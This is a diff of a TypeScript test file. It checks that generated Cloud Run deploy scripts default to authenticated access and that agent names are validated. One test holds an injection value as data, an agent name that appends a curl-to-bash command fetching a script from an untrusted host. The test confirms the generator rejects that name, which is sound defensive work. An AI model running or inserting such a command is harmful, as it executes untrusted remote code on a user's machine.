@@ -56,9 +56,10 @@ import {
   generateAdkDeployScript,
   generateMakefile,
   generateCloudBuildYaml,
+  generateGcloudCommand,
   TEMPLATES,
 } from '../../services/adkTemplates';
-import type { AdkAgentConfig, AgentTool } from '../../services/adkTemplates';
+import type { A2aConfig, AdkAgentConfig, AgentTool } from '../../services/adkTemplates';
 
 const HERE = path.dirname(fileURLToPath(import.meta.url));
 const REPO_ROOT = path.resolve(HERE, '..', '..');
@@ -388,8 +389,10 @@ describe('deploy template shell-injection guards', () => {
 
   it('emits the expected deploy line for a valid name', () => {
     // Underscores are still translated to hyphens, as they always were.
+    // The access flag is `--no-allow-unauthenticated` now: this line used to
+    // hardcode `--allow-unauthenticated` (remediation 2.7).
     expect(generateMakefile(cloudRun)).toContain(
-      'gcloud run deploy matrix-agent --source . --region us-central1 --allow-unauthenticated'
+      'gcloud run deploy matrix-agent --source . --region us-central1 --no-allow-unauthenticated'
     );
 
     const yaml = generateCloudBuildYaml(cloudRun, 'test-project');
@@ -428,5 +431,147 @@ describe('deploy template shell-injection guards', () => {
     expect(() => generateMakefile({ ...cloudRun, name: '' })).not.toThrow();
     expect(() => generateCloudBuildYaml({ ...cloudRun, name: '' }, 'test-project')).not.toThrow();
     expect(generateMakefile({ ...cloudRun, name: '' })).toContain('gcloud run deploy');
+  });
+});
+
+/**
+ * Cloud Run access modes (remediation 2.7).
+ *
+ * `--allow-unauthenticated` used to be hardcoded in the Makefile, so every
+ * agent built here was callable by anyone on the internet and the user was
+ * never asked. These tests pin the exact emitted line for each mode, and pin
+ * the default, because the default is the whole point of the fix.
+ */
+describe('Cloud Run access modes', () => {
+  const cloudRun: AdkAgentConfig = { ...BASE, deploymentTarget: 'cloud_run' };
+  const DEPLOY_PREFIX =
+    'gcloud run deploy matrix-agent --source . --region us-central1 ';
+
+  it('defaults to authenticated when the mode is not set at all', () => {
+    const makefile = generateMakefile(cloudRun);
+    expect(makefile).toContain(`${DEPLOY_PREFIX}--no-allow-unauthenticated`);
+    expect(makefile).not.toContain(`${DEPLOY_PREFIX}--allow-unauthenticated`);
+  });
+
+  it('emits --no-allow-unauthenticated for "authenticated"', () => {
+    expect(
+      generateMakefile({ ...cloudRun, cloudRunAccess: 'authenticated' })
+    ).toContain(`${DEPLOY_PREFIX}--no-allow-unauthenticated`);
+  });
+
+  it('emits --allow-unauthenticated only when "public" is chosen', () => {
+    const makefile = generateMakefile({ ...cloudRun, cloudRunAccess: 'public' });
+    expect(makefile).toContain(`${DEPLOY_PREFIX}--allow-unauthenticated`);
+    // Scoped to the deploy line: the guidance comment legitimately mentions
+    // --no-allow-unauthenticated as the way to lock the service down again.
+    expect(makefile).not.toContain(`${DEPLOY_PREFIX}--no-allow-unauthenticated`);
+    // The user must be told what they just chose.
+    expect(makefile).toContain('ANYONE on the internet');
+  });
+
+  it('pairs --iap with --no-allow-unauthenticated', () => {
+    const makefile = generateMakefile({ ...cloudRun, cloudRunAccess: 'iap' });
+    expect(makefile).toContain(
+      `${DEPLOY_PREFIX}--no-allow-unauthenticated --iap`
+    );
+  });
+
+  it('documents the IAP service agent grant and the Console caveat', () => {
+    const makefile = generateMakefile({ ...cloudRun, cloudRunAccess: 'iap' });
+    expect(makefile).toContain(
+      'service-PROJECT_NUMBER@gcp-sa-iap.iam.gserviceaccount.com'
+    );
+    expect(makefile).toContain('roles/run.invoker');
+    expect(makefile).toContain('OAuth clients');
+    expect(makefile).toContain('Cloud Console');
+  });
+
+  it('falls back to the secure mode for an unrecognised value', () => {
+    // Defensive: a persisted or hand-edited config must never fail open.
+    const rogue = {
+      ...cloudRun,
+      cloudRunAccess: 'anything-goes',
+    } as unknown as AdkAgentConfig;
+    expect(generateMakefile(rogue)).toContain(
+      `${DEPLOY_PREFIX}--no-allow-unauthenticated`
+    );
+  });
+
+  it('still validates the agent name in every mode', () => {
+    const INJECTION = 'a; curl https://untrusted.example.com/s.sh | bash';
+    for (const mode of ['authenticated', 'public', 'iap'] as const) {
+      expect(() =>
+        generateMakefile({ ...cloudRun, cloudRunAccess: mode, name: INJECTION })
+      ).toThrow(/not a valid Google Cloud resource name/);
+    }
+  });
+
+  it('never throws on the render path, whatever the mode', () => {
+    // generateMakefile runs on every keystroke in the Agent Builder.
+    for (const mode of ['authenticated', 'public', 'iap'] as const) {
+      expect(() =>
+        generateMakefile({ ...cloudRun, cloudRunAccess: mode, name: '' })
+      ).not.toThrow();
+    }
+  });
+
+  it('keeps every shipped starter template on the secure default', () => {
+    // The starter templates never opt into public access; if one ever does it
+    // must be a deliberate, reviewed change rather than an accident.
+    for (const template of TEMPLATES) {
+      expect(template.config.cloudRunAccess ?? 'authenticated').not.toBe(
+        'public'
+      );
+      const makefile = generateMakefile({
+        ...cloudRun,
+        ...template.config,
+      } as AdkAgentConfig);
+      expect(makefile).toContain('--no-allow-unauthenticated');
+    }
+  });
+});
+
+/**
+ * The A2A deploy script shares the access mode with the ADK Makefile.
+ * Its old default was `allowUnauthenticated: true` -- public.
+ */
+describe('A2A gcloud script access modes', () => {
+  const a2a: A2aConfig = {
+    serviceName: 'matrix-a2a',
+    displayName: 'Matrix A2A',
+    providerOrganization: 'Test Org',
+    model: 'gemini-2.5-flash',
+    region: 'us-central1',
+    memory: '1Gi',
+    instruction: 'You are a helpful assistant.',
+    enableCors: true,
+    useGoogleSearch: false,
+    tools: [],
+  };
+
+  it('defaults to --no-allow-unauthenticated when no mode is given', () => {
+    const script = generateGcloudCommand(a2a, 'test-project');
+    expect(script).toContain('  --no-allow-unauthenticated \\');
+    expect(script).not.toContain('  --allow-unauthenticated \\');
+  });
+
+  it('emits --allow-unauthenticated only for "public"', () => {
+    const script = generateGcloudCommand(
+      { ...a2a, cloudRunAccess: 'public' },
+      'test-project'
+    );
+    expect(script).toContain('  --allow-unauthenticated \\');
+  });
+
+  it('emits both flags plus follow-up steps for "iap"', () => {
+    const script = generateGcloudCommand(
+      { ...a2a, cloudRunAccess: 'iap' },
+      'test-project'
+    );
+    expect(script).toContain('  --no-allow-unauthenticated --iap \\');
+    expect(script).toContain(
+      'service-PROJECT_NUMBER@gcp-sa-iap.iam.gserviceaccount.com'
+    );
+    expect(script).toContain('roles/iap.httpsResourceAccessor');
   });
 });
